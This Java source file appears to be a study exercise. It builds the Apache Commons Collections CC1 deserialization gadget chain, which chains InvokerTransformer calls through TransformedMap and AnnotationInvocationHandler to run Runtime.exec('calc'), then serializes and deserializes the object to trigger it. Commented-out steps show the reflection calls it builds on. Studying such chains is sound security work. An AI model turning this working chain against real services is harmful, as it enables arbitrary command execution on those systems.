package com.testdemo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Annotation;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;


public class demo01 {
    public static void main(String[] args) throws Exception {
//        Runtime.getRuntime().exec("calc.exe");   普通显性调用


//        Runtime r = Runtime.getRuntime();        //反射调用
//        Class c = Runtime.class;
//        Method exec = c.getMethod("exec", String.class);
//        exec.invoke(r,"calc");

//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"});
        //invokertransformer.transform(r)


//        Method getRuntimemethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
//        Runtime runtimeobj = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimemethod);
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtimeobj);

//        Runtime.getRuntime().exec("calc");



//        Class clz = Runtime.class;
//        Method runMet = clz.getDeclaredMethod("getRuntime");
//        Object runtime =runMet.invoke(clz,null);
//
//        Method exec = clz.getDeclaredMethod("exec", String.class);
//        exec.invoke(runtime,"calc");

//        Object transform = new ConstantTransformer(Runtime.class).transform("asdada");
//        System.out.println(transform);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
////        InvocationHandler
//        Proxy
        ChainedTransformer chain = new ChainedTransformer(transformers);


        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","1");
        Map<Object,Object> transformedmap =  TransformedMap.decorate(map,null,chain);


        Class an = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = an.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class,transformedmap);
        serialize(o);
        unserialize("ser.bin");

    }
    public static void serialize(Object o) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(o);
    }
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}

